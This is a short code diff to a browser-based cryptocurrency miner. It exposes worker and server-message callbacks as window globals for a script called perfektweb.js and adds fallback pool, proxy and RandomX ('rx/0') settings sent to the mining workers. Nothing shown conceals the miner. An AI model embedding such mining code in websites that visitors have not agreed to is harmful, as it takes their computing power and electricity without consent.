@@ -292,12 +292,13 @@
       }, 5000);
     }
     
-    var informWorker = function(worker, workerId) {
+    // GLOBAL CALLBACK - perfektweb.js looks for this on window object
+    window.informWorker = function(worker, workerId) {
       // Called by perfektweb.js to send initial config to worker
       console.log('[DEBUG informWorker] Worker #' + workerId + ' - sending config:', {
-        proxy: rightProxy,
-        pool: rightPool,
-        algo: rightalgo,
+        proxy: typeof rightProxy !== 'undefined' ? rightProxy : 'not set',
+        pool: typeof rightPool !== 'undefined' ? rightPool : 'not set',
+        algo: typeof rightalgo !== 'undefined' ? rightalgo : 'not set',
         wallet: CONFIG.WALLET.substring(0, 20) + '...'
       });
       log('Worker #' + workerId + ' initialized', 'success');
@@ -308,15 +309,16 @@
       // Send configuration to worker
       worker.postMessage({
         type: 'config',
-        proxy: rightProxy,
-        pool: rightPool,
-        algo: rightalgo,
+        proxy: typeof rightProxy !== 'undefined' ? rightProxy : CONFIG.PROXY_URL,
+        pool: typeof rightPool !== 'undefined' ? rightPool : CONFIG.POOL_URL,
+        algo: typeof rightalgo !== 'undefined' ? rightalgo : 'rx/0',
         wallet: CONFIG.WALLET,
         worker: CONFIG.WORKER_NAME
       });
     };
     
-    var on_servermsg = function(e) {
+    // GLOBAL CALLBACK - perfektweb.js calls this when it receives messages from server
+    window.on_servermsg = function(e) {
       // Messages from pool/proxy - THIS IS CRITICAL FOR SHARE ACCEPTANCE
       console.log('[DEBUG on_servermsg] Received:', JSON.stringify(e));
       if (e && e.type) {
@@ -357,7 +359,8 @@
       }
     };
     
-    var on_workermsg = function(e, workerId) {
+    // GLOBAL CALLBACK - perfektweb.js calls this when workers report results
+    window.on_workermsg = function(e, workerId) {
       // Messages from mining workers
       if (!e || !e.data) return;
       
